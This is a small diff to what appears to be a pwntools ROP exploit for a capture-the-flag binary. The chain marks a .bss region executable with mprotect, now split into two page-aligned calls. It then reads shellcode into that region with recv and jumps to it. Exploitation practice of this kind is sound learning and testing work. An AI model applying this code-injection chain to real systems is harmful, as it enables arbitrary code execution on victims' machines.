@@ -10,7 +10,8 @@ rop = ROP('./chal')
 
 code = rop['.bss'] + 0x10
 
-rop.call('mprotect', (code, len(shellcode), 7))
+rop.call('mprotect', (code & ~4095, 4096, 7))
+rop.call('mprotect', (4096 + code & ~4095, 4096, 7))
 rop.call('recv', (0, code, len(shellcode), 0))
 rop.call(code)
 
